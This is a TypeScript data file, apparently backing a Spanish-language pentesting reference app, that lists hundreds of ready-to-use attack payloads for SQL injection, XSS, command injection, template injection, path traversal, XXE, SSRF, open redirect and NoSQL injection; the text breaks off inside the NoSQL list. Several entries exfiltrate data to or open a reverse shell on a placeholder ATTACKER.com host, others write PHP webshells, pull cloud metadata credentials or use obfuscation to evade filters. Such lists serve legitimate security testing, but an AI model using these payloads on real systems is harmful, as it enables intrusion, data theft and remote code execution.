export interface PayloadCategory {
  title: string
  description: string
  tag: string
  tagColor: string
  payloads: string[]
}

export const sqliClassic: PayloadCategory = {
  title: "SQLi — Classic",
  description: "Payloads básicos de inyección SQL para tests iniciales en parámetros GET/POST",
  tag: "SQL Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    `'`,
    `''`,
    `'--`,
    `'--+`,
    `' OR '1'='1`,
    `' OR '1'='1'--`,
    `' OR '1'='1'/*`,
    `' OR 1=1--`,
    `' OR 1=1#`,
    `' OR 1=1/*`,
    `') OR ('1'='1`,
    `') OR ('1'='1'--`,
    `' OR 'x'='x`,
    `" OR "1"="1`,
    `" OR "1"="1"--`,
    `" OR 1=1--`,
    `1' ORDER BY 1--`,
    `1' ORDER BY 2--`,
    `1' ORDER BY 3--`,
    `1' GROUP BY 1,2,--`,
    `1' UNION SELECT NULL--`,
    `1' UNION SELECT NULL,NULL--`,
    `1' UNION SELECT NULL,NULL,NULL--`,
    `' HAVING 1=1--`,
    `' HAVING '1'='1`,
    `1; DROP TABLE users--`,
    `1; SELECT SLEEP(5)--`,
    `admin'--`,
    `admin' #`,
    `' OR 1=1 LIMIT 1--`,
  ],
}

export const sqliUnionBased: PayloadCategory = {
  title: "SQLi — UNION Based",
  description: "Extracción de datos mediante UNION SELECT para enumerar bases de datos, tablas y columnas",
  tag: "SQL Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    `' UNION SELECT NULL--`,
    `' UNION SELECT NULL,NULL--`,
    `' UNION SELECT NULL,NULL,NULL--`,
    `' UNION SELECT 1--`,
    `' UNION SELECT 1,2--`,
    `' UNION SELECT 1,2,3--`,
    `' UNION SELECT username,password FROM users--`,
    `' UNION SELECT table_name,NULL FROM information_schema.tables--`,
    `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`,
    `' UNION SELECT schema_name,NULL FROM information_schema.schemata--`,
    `' UNION SELECT @@version,NULL--`,
    `' UNION SELECT user(),NULL--`,
    `' UNION SELECT database(),NULL--`,
    `' UNION SELECT load_file('/etc/passwd'),NULL--`,
    `' UNION ALL SELECT NULL,NULL,NULL--`,
    `' UNION ALL SELECT 'a',NULL,NULL--`,
    `1 UNION SELECT NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--`,
    `' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--`,
    `' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273--`,
    `' UNION SELECT 1,concat(username,0x3a,password),3 FROM users--`,
  ],
}

export const sqliErrorBased: PayloadCategory = {
  title: "SQLi — Error Based",
  description: "Extracción de datos a través de mensajes de error del motor de base de datos",
  tag: "SQL Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    `' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--`,
    `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--`,
    `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--`,
    `' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--`,
    `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--`,
    `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
    `' AND exp(~(SELECT * FROM(SELECT database())a))--`,
    `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
    `1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT database())),1)--`,
    `1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database())) USING utf8)))--`,
    `' OR 1 GROUP BY CONCAT(database(),FLOOR(RAND(0)*2)) HAVING MIN(0)--`,
    `' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--`,
    `' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND()*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--`,
  ],
}

export const sqliBlindBoolean: PayloadCategory = {
  title: "SQLi — Blind Boolean",
  description: "Inferencia de datos bit a bit cuando la app responde diferente ante condición true/false",
  tag: "SQL Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    `' AND 1=1--`,
    `' AND 1=2--`,
    `' AND SUBSTRING(database(),1,1)='a'--`,
    `' AND SUBSTRING(database(),1,1)='b'--`,
    `' AND (SELECT SUBSTRING(database(),1,1))='a'--`,
    `' AND ASCII(SUBSTRING(database(),1,1))>97--`,
    `' AND ASCII(SUBSTRING(database(),1,1))=109--`,
    `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--`,
    `' AND (SELECT LENGTH(database()))=5--`,
    `' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'--`,
    `' AND IF(1=1,SLEEP(0),0)--`,
    `' AND IF(1=2,SLEEP(0),1)--`,
    `1' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)--`,
    `1' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--`,
  ],
}

export const sqliTimeBased: PayloadCategory = {
  title: "SQLi — Time Based Blind",
  description: "Detección y extracción inferencial mediante retardos de tiempo (SLEEP / WAITFOR / pg_sleep)",
  tag: "SQL Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    `'; WAITFOR DELAY '0:0:5'--`,
    `'; WAITFOR DELAY '0:0:5'--+`,
    `1; WAITFOR DELAY '0:0:5'--`,
    `' AND SLEEP(5)--`,
    `' AND SLEEP(5)#`,
    `' OR SLEEP(5)--`,
    `1' AND SLEEP(5)--`,
    `1 AND SLEEP(5)--`,
    `'; SELECT SLEEP(5)--`,
    `' AND (SELECT SLEEP(5))--`,
    `' AND IF(1=1,SLEEP(5),0)--`,
    `' AND IF(1=2,SLEEP(5),0)--`,
    `' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--`,
    `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--`,
    `'; SELECT pg_sleep(5)--`,
    `1; SELECT pg_sleep(5)--`,
    `' || pg_sleep(5)--`,
    `'; EXEC xp_cmdshell('ping 127.0.0.1 -n 5')--`,
    `' AND BENCHMARK(5000000,MD5(1))--`,
    `' OR BENCHMARK(5000000,MD5(1))--`,
  ],
}

export const sqliObfuscated: PayloadCategory = {
  title: "SQLi — Obfuscado / WAF Bypass",
  description: "Variantes con case mixing, comentarios inline, codificación hex, double-encode para evadir filtros",
  tag: "SQL Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    `' /*!UNION*/ /*!SELECT*/ NULL--`,
    `' /*!50000UNION*//*!50000SELECT*/ NULL,NULL--`,
    `'/**/UNION/**/SELECT/**/NULL--`,
    `'%09UNION%09SELECT%09NULL--`,
    `'%0aUNION%0aSELECT%0aNULL--`,
    `' uNiOn SeLeCt NULL--`,
    `' UnIoN ALL SeLeCt NULL,NULL--`,
    `'+UNION+SELECT+NULL--`,
    `'%2BUNION%2BSELECT%2BNULL--`,
    `0x27206f7220273127313d27`,
    `' OR 0x31=0x31--`,
    `' OR CHAR(49)=CHAR(49)--`,
    `' OR 0b1=0b1--`,
    `'' OR '1'='1`,
    `%27%20OR%20%271%27%3D%271`,
    `%2527 OR %25271%2527%253D%25271`,
    `' OR/**/'1'/**/=/**/'1`,
    `'||'1'='1`,
    `'\||'1'='1`,
    `' OR 2>1--`,
    `' OR 'unusual'='unusual`,
    `';EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(49))--`,
    `'; DECLARE @q NVARCHAR(4000) SET @q='SEL'+'ECT 1' EXEC(@q)--`,
    `' AND 1=1 UNION%23foo*%0D%0Abar%0D%0ASELECT%23foo%0D%0A1,2,3--`,
    `' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT/**/database())))--`,
  ],
}

export const sqliOOB: PayloadCategory = {
  title: "SQLi — Out-of-Band (OOB)",
  description: "Exfiltración de datos mediante DNS o HTTP hacia un servidor externo (requiere outbound network)",
  tag: "SQL Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    `'; EXEC master..xp_dirtree '//ATTACKER.com/a'--`,
    `'; EXEC master..xp_fileexist '//ATTACKER.com/a'--`,
    `' UNION SELECT load_file(CONCAT('\\\\\\\\',(SELECT database()),'.ATTACKER.com\\\\a'))--`,
    `' AND LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT database()),0x2e4154544143.4b45522e636f6d5c5c61))--`,
    `' OR 1=1 INTO OUTFILE '\\\\\\\\ATTACKER.com\\\\share\\\\output.txt'--`,
    `'; EXEC xp_cmdshell 'nslookup ATTACKER.com'--`,
    `'; EXEC xp_cmdshell 'curl http://ATTACKER.com/?d=$(whoami)'--`,
    `' AND UTL_HTTP.REQUEST('http://ATTACKER.com/'||(SELECT user FROM dual)) IS NOT NULL--`,
    `' UNION SELECT UTL_HTTP.REQUEST('http://ATTACKER.com/'||user) FROM dual--`,
    `' AND (SELECT * FROM (SELECT(UTL_INADDR.get_host_addr(CONCAT((SELECT user FROM dual),'.ATTACKER.com'))))a)--`,
    `'; COPY (SELECT database()) TO PROGRAM 'curl http://ATTACKER.com/?d='||current_database()--`,
  ],
}

export const xssClassic: PayloadCategory = {
  title: "XSS — Classic",
  description: "Payloads básicos de Cross-Site Scripting con etiquetas <script> y atributos de evento",
  tag: "XSS",
  tagColor: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  payloads: [
    `<script>alert(1)</script>`,
    `<script>alert('XSS')</script>`,
    `<script>alert(document.cookie)</script>`,
    `<script>alert(document.domain)</script>`,
    `<script>confirm(1)</script>`,
    `<script>prompt(1)</script>`,
    `<script>console.log(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<img src="x" onerror="alert(1)">`,
    `<img src=x onerror=alert(document.cookie)>`,
    `<svg onload=alert(1)>`,
    `<svg/onload=alert(1)>`,
    `<svg onload="alert(1)">`,
    `<body onload=alert(1)>`,
    `<input autofocus onfocus=alert(1)>`,
    `<select autofocus onfocus=alert(1)>`,
    `<textarea autofocus onfocus=alert(1)>`,
    `<video src=x onerror=alert(1)>`,
    `<audio src=x onerror=alert(1)>`,
    `<details open ontoggle=alert(1)>`,
    `<marquee onstart=alert(1)>`,
    `"><script>alert(1)</script>`,
    `'><script>alert(1)</script>`,
    `</title><script>alert(1)</script>`,
    `</textarea><script>alert(1)</script>`,
    `</script><script>alert(1)</script>`,
  ],
}

export const xssFilterBypass: PayloadCategory = {
  title: "XSS — Filter Bypass",
  description: "Técnicas para evadir filtros básicos: mayúsculas, null bytes, comentarios, atributos redundantes",
  tag: "XSS",
  tagColor: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  payloads: [
    `<ScRiPt>alert(1)</ScRiPt>`,
    `<SCRIPT>alert(1)</SCRIPT>`,
    `<sCrIpT>alert(1)</ScRiPt>`,
    `<img SRC=x oNErRoR=alert(1)>`,
    `<IMG SRC="x" ONERROR="alert(1)">`,
    `<scr<script>ipt>alert(1)</scr</script>ipt>`,
    `<scr\x00ipt>alert(1)</scr\x00ipt>`,
    `<scr\x09ipt>alert(1)</scrip>`,
    `<scr\x0aipt>alert(1)</scrip>`,
    `<scr\x0dipt>alert(1)</scrip>`,
    `<img src="x" onerror = "alert(1)">`,
    `<img src=x onerror\t=alert(1)>`,
    `<img src=x onerror\r=alert(1)>`,
    `<img src=x onerror\n=alert(1)>`,
    `<img src=x onerror/=alert(1)>`,
    `< img src=x onerror=alert(1)>`,
    `<img src=x onerror=alert\x28\x31\x29>`,
    `<img src=x onerror=alert&#x28;1&#x29;>`,
    `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`,
    `<a href="javascript:alert(1)">click</a>`,
    `<a href="javascript:alert(1)" >click</a>`,
    `<a href="jAvAsCrIpT:alert(1)">click</a>`,
    `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>`,
    `<a href="java&#9;script:alert(1)">click</a>`,
    `<a href="java&#10;script:alert(1)">click</a>`,
    `<a href="java&#13;script:alert(1)">click</a>`,
    `<!--<img src="--><img src=x onerror=alert(1)>`,
    `<comment><img src="</comment><img src=x onerror=alert(1)>`,
  ],
}

export const xssObfuscated: PayloadCategory = {
  title: "XSS — Obfuscado / Encodings",
  description: "Payloads usando HTML entities, Unicode escapes, URL encoding, JS string splitting y eval tricks",
  tag: "XSS",
  tagColor: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  payloads: [
    `&lt;script&gt;alert(1)&lt;/script&gt;`,
    `&#60;script&#62;alert(1)&#60;/script&#62;`,
    `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
    `<script>alert(1)</script>`,
    `%3Cscript%3Ealert%281%29%3C%2Fscript%3E`,
    `%253Cscript%253Ealert(1)%253C/script%253E`,
    `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,
    `<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>`,
    `<img src=x onerror=alert(1)>`,
    `<svg><script>alert&#40;1&#41;</script></svg>`,
    `<svg><script>alert(1&#41;</script></svg>`,
    `<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script></svg>`,
    `<math><a xlink:href="javascript:alert(1)">click</a></math>`,
    `<table background="javascript:alert(1)">`,
    `<object data="javascript:alert(1)">`,
    `<iframe src="javascript:alert(1)">`,
    `<iframe srcdoc="<script>alert(1)</script>">`,
    `<form action="javascript:alert(1)"><input type="submit"></form>`,
    `<isindex type=image src=1 onerror=alert(1)>`,
    `<base href="javascript://"/><a href="/_ onclick=eval(atob(this.id))" id="YWxlcnQoMSk=">click</a>`,
    `<script>window['al'+'ert'](1)</script>`,
    `<script>(alert)(1)</script>`,
    `<script>alert(1)</script>`,
    `<script>alert(1)</script>`,
    `<script>\\u0061lert(1)</script>`,
    `<script>setTimeout('alert(1)',0)</script>`,
    `<script>setInterval('alert(1)',99999)</script>`,
    `<script>Function('alert(1)')()</script>`,
    `<script>[].constructor.constructor('alert(1)')()</script>`,
    `<script>(()=>{})['constructor']('alert(1)')()</script>`,
  ],
}

export const xssDOM: PayloadCategory = {
  title: "XSS — DOM Based",
  description: "Vectores que manipulan el DOM directamente: location.hash, document.write, innerHTML sinks",
  tag: "XSS",
  tagColor: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  payloads: [
    `#<script>alert(1)</script>`,
    `#<img src=x onerror=alert(1)>`,
    `javascript:alert(1)`,
    `data:text/html,<script>alert(1)</script>`,
    `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
    `"><img src=x onerror=alert(1)>`,
    `'-alert(1)-'`,
    `\'-alert(1)//`,
    `</script><img src=x onerror=alert(1)>`,
    `\";alert(1)//`,
    `';alert(1)//`,
    "`${alert(1)}`",
    `</title><img src=x onerror=alert(1)>`,
    `</style><img src=x onerror=alert(1)>`,
    `--></script><img src=x onerror=alert(1)>`,
    `</textarea><img src=x onerror=alert(1)>`,
  ],
}

export const xssPolyglot: PayloadCategory = {
  title: "XSS — Polyglots",
  description: "Payloads que funcionan en múltiples contextos (HTML, atributos, JS, URLs) simultáneamente",
  tag: "XSS",
  tagColor: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  payloads: [
    `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e`,
    `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>`,
    `';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
    `" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//`,
    `'">><img src=xxx:x onerror=javascript:alert(1)>`,
    `\`-alert(1)-\``,
    `<img/src=\`%00\` onerror=this.onerror=alert,1>`,
    `<script\\x20type="text/javascript">javascript:alert(1);</script>`,
  ],
}

export const cmdInjection: PayloadCategory = {
  title: "Command Injection — Classic",
  description: "Inyección de comandos OS en parámetros que pasan input a funciones system/exec/shell_exec",
  tag: "RCE",
  tagColor: "bg-red-500/10 text-red-400 border-red-500/20",
  payloads: [
    `; id`,
    `; whoami`,
    `; cat /etc/passwd`,
    `; ls -la`,
    `; pwd`,
    `& id`,
    `& whoami`,
    `| id`,
    `| whoami`,
    `|| id`,
    `|| whoami`,
    `\`id\``,
    `$(id)`,
    `$(whoami)`,
    `; id #`,
    `; id //`,
    `; id /*`,
    `1; id`,
    `1 && id`,
    `1 | id`,
    `1 || id`,
    `; sleep 5`,
    `& sleep 5`,
    `| sleep 5`,
    `$(sleep 5)`,
    `\`sleep 5\``,
    `;ping -c 5 127.0.0.1`,
    `& ping -c 5 127.0.0.1`,
    `| ping -c 5 127.0.0.1`,
    `; curl http://ATTACKER.com/$(whoami)`,
    `; wget http://ATTACKER.com/?d=$(id)`,
    `; nslookup ATTACKER.com`,
    `; bash -i >& /dev/tcp/ATTACKER.com/4444 0>&1`,
  ],
}

export const cmdInjectionObfuscated: PayloadCategory = {
  title: "Command Injection — Obfuscado",
  description: "Variantes con IFS, globbing, string splitting, env vars y encoding para evadir WAF/filtros",
  tag: "RCE",
  tagColor: "bg-red-500/10 text-red-400 border-red-500/20",
  payloads: [
    `; i$@d`,
    `; wh$@oami`,
    `; w'h'o'a'm'i`,
    `; w"h"o"a"m"i`,
    `; /bin/i\d`,
    `; /bi''n/id`,
    `; /b\in/id`,
    `; $IFS&&id`,
    `; id$IFS`,
    `; {id}`,
    `; {cat,/etc/passwd}`,
    `; {curl,http://ATTACKER.com}`,
    `;\t id`,
    `;\rid`,
    `;\nid`,
    `; id%0a`,
    `%0a id`,
    `%0d%0a id`,
    `%0a%0d id`,
    "$(echo 'aWQ=' | base64 -d | bash)",
    "$(echo 'd2hvYW1p' | base64 -d | bash)",
    "; $(printf 'i\\144')",
    "; $(printf '\\x69\\x64')",
    '; eval "$(echo aWQ=|base64 -d)"',
    "; X=$'id'; $X",
    "; $'\\x69\\x64'",
    "; echo${IFS}id|bash",
    "|${IFS}id",
    `;$IFS$9id`,
    `1;$()id`,
    "; bash${IFS}-c${IFS}'id'",
    `; env x='() { :;}; id' bash -c id 2>/dev/null`,
  ],
}

export const sstiPayloads: PayloadCategory = {
  title: "SSTI — Template Injection",
  description: "Detección y explotación de Server-Side Template Injection en Jinja2, Twig, Freemarker, ERB y más",
  tag: "SSTI",
  tagColor: "bg-orange-500/10 text-orange-400 border-orange-500/20",
  payloads: [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "@(7*7)",
    "{{config}}",
    "{{config.items()}}",
    "{{self.__dict__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{[].__class__.__base__.__subclasses__()}}",
    "{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__[\'__import__\'](\'os\').popen(\'id\').read()}}{%endif%}{% endfor %}',
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php', 'w').write('<?php system($_GET[cmd]); ?>') }}",
    "${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
    "<%= File.open('/etc/passwd').read %>",
    "<%= system('id') %>",
    "<%= `id` %>",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}",
    "{% import os %}{{ os.system('id') }}",
    '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\').toString()")()}}',
    "{{this.constructor.constructor('return process.env')()}}",
    '{{this.constructor.constructor(\'return require("child_process").execSync("id").toString()\')()}}',
  ],
}

export const pathTraversal: PayloadCategory = {
  title: "Path Traversal / LFI",
  description: "Lectura de archivos locales arbitrarios mediante traversal en parámetros file/path/page",
  tag: "LFI / Traversal",
  tagColor: "bg-teal-500/10 text-teal-400 border-teal-500/20",
  payloads: [
    `../etc/passwd`,
    `../../etc/passwd`,
    `../../../etc/passwd`,
    `../../../../etc/passwd`,
    `../../../../../etc/passwd`,
    `../../../../../../etc/passwd`,
    `../../../../../../../etc/passwd`,
    `../../../../../../../../etc/passwd`,
    `../etc/passwd%00`,
    `../../etc/passwd%00`,
    `../../../../../etc/passwd%00`,
    `..%2Fetc%2Fpasswd`,
    `..%2F..%2Fetc%2Fpasswd`,
    `..%2F..%2F..%2Fetc%2Fpasswd`,
    `..%252Fetc%252Fpasswd`,
    `..%252F..%252Fetc%252Fpasswd`,
    `..%c0%afetc%c0%afpasswd`,
    `..%c1%9cetc%c1%9cpasswd`,
    `....//etc/passwd`,
    `....//....//etc/passwd`,
    `....//..//etc/passwd`,
    `....\\\\etc\\\\passwd`,
    `/etc/passwd`,
    `/etc/shadow`,
    `/etc/hosts`,
    `/etc/hostname`,
    `/proc/self/environ`,
    `/proc/self/cmdline`,
    `/proc/self/fd/0`,
    `/proc/version`,
    `/var/log/apache2/access.log`,
    `/var/log/apache/access.log`,
    `/var/log/nginx/access.log`,
    `/var/log/auth.log`,
    `C:\\Windows\\win.ini`,
    `C:\\Windows\\System32\\drivers\\etc\\hosts`,
    `C:\\boot.ini`,
    `php://filter/read=convert.base64-encode/resource=/etc/passwd`,
    `php://filter/convert.base64-encode/resource=index.php`,
    `php://input`,
    `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`,
    `expect://id`,
    `file:///etc/passwd`,
    `zip://shell.jpg#shell.php`,
    `phar://shell.phar/shell.php`,
  ],
}

export const xxePayloads: PayloadCategory = {
  title: "XXE — XML External Entities",
  description: "Lectura de archivos y SSRF mediante entidades externas XML en parsers mal configurados",
  tag: "XXE",
  tagColor: "bg-blue-500/10 text-blue-400 border-blue-500/20",
  payloads: [
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<root>&xxe;</root>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER.com/xxe">]>
<root>&xxe;</root>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<data>&file;</data>`,
    `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER.com/xxe.dtd">
  %xxe;
]>
<root>&send;</root>`,
    `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKER.com/?d=%data;'>">
  %param1;
]>
<foo>&exfil;</foo>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
<root>&xxe;</root>`,
    `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<root>&xxe;</root>`,
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://ATTACKER.com/xxe.jar!/xxe.txt">]>
<root>&xxe;</root>`,
  ],
}

export const ssrfPayloads: PayloadCategory = {
  title: "SSRF — Server-Side Request Forgery",
  description: "Acceso a servicios internos y metadata cloud desde el servidor mediante parámetros URL controlables",
  tag: "SSRF",
  tagColor: "bg-indigo-500/10 text-indigo-400 border-indigo-500/20",
  payloads: [
    `http://localhost/`,
    `http://127.0.0.1/`,
    `http://0.0.0.0/`,
    `http://[::1]/`,
    `http://0/`,
    `http://0x7f000001/`,
    `http://2130706433/`,
    `http://127.1/`,
    `http://127.0.1/`,
    `http://localhost:22/`,
    `http://localhost:80/`,
    `http://localhost:443/`,
    `http://localhost:3306/`,
    `http://localhost:6379/`,
    `http://localhost:9200/`,
    `http://localhost:8080/`,
    `http://169.254.169.254/`,
    `http://169.254.169.254/latest/meta-data/`,
    `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    `http://169.254.169.254/latest/user-data/`,
    `http://169.254.169.254/computeMetadata/v1/`,
    `http://metadata.google.internal/computeMetadata/v1/?recursive=true`,
    `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
    `http://169.254.169.254/metadata/instance?api-version=2021-01-01`,
    `http://100.100.100.200/latest/meta-data/`,
    `http://192.168.0.1/`,
    `http://10.0.0.1/`,
    `http://172.16.0.1/`,
    `dict://127.0.0.1:6379/info`,
    `gopher://127.0.0.1:6379/_FLUSHALL%0D%0A`,
    `gopher://127.0.0.1:3306/_%00%00%01%85%a6...`,
    `file:///etc/passwd`,
    `file:///c:/windows/win.ini`,
    `ldap://127.0.0.1/`,
    `sftp://127.0.0.1/`,
    `tftp://127.0.0.1:69/TEST`,
    `http://127.0.0.1\@ATTACKER.com/`,
    `http://ATTACKER.com\@127.0.0.1/`,
    `http://127.0.0.1%2523@ATTACKER.com/`,
    `http://0x7f.0x00.0x00.0x01/`,
    `http://0177.0000.0000.0001/`,
    `http://127.000.000.001/`,
  ],
}

export const openRedirect: PayloadCategory = {
  title: "Open Redirect",
  description: "Payloads para explotar redirecciones abiertas en parámetros redirect/url/return/next",
  tag: "Open Redirect",
  tagColor: "bg-cyan-500/10 text-cyan-400 border-cyan-500/20",
  payloads: [
    `//ATTACKER.com`,
    `///ATTACKER.com`,
    `////ATTACKER.com`,
    `https://ATTACKER.com`,
    `//ATTACKER.com/%2F..`,
    `//ATTACKER.com/%2F%2E%2E`,
    `/\\ATTACKER.com`,
    `//\\ATTACKER.com`,
    `///\\ATTACKER.com`,
    `/%09/ATTACKER.com`,
    `/%0a/ATTACKER.com`,
    `/%0d/ATTACKER.com`,
    `/\t/ATTACKER.com`,
    `//ATTACKER%E3%80%82com`,
    `//ATTACKER%00.com`,
    `https:ATTACKER.com`,
    `https://ATTACKER.com?a=LEGITIMATE.com`,
    `https://LEGITIMATE.com@ATTACKER.com`,
    `https://ATTACKER.com/LEGITIMATE.com`,
    `//ATTACKER.com//LEGITIMATE.com`,
    `javascript:alert(1)`,
    `javascript://comment%0Aalert(1)`,
    `data:text/html,<script>alert(1)</script>`,
    `/%2F%2FATTACKER.com`,
    `/%5C%5CATTACKER.com`,
    `https://ATTACKER.com#.LEGITIMATE.com`,
    `https://ATTACKER.com?.LEGITIMATE.com`,
  ],
}

export const nosqlInjection: PayloadCategory = {
  title: "NoSQL Injection — MongoDB",
  description: "Bypass de autenticación y extracción de datos en MongoDB via operadores $ne, $gt, $where y $regex",
  tag: "NoSQL Injection",
  tagColor: "bg-green-500/10 text-green-400 border-green-500/20",
  payloads: [
    // Auth bypass en JSON body
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}',
    '{"username": "admin", "password": {"$gt": ""}}',
    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
    '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$gt": ""}}',
    // Auth bypass en parámetros URL / form
    "username[$ne]=invalid&password[$ne]=invalid",
    "username[$gt]=&password[$gt]=",
    "username[$regex]=.*&password[$regex]=.*",
    "username=admin&password[$ne]=wrongpass",
    "username[$in][]=admin&password[$gt]=",
    // $where JS injection
    '{"$where": "this.username == this.password"}',
    '{"$where": "sleep(5000)"}',
    '{"$where": "function(){ return true; }"}',
    '{"$where": "1 == 1"}',
    // Extracción ciega (regex enumeration)
    '{"username": "admin", "password": {"$regex": "^a"}}',
    '{"username": "admin", "password": {"$regex": "^ab"}}',
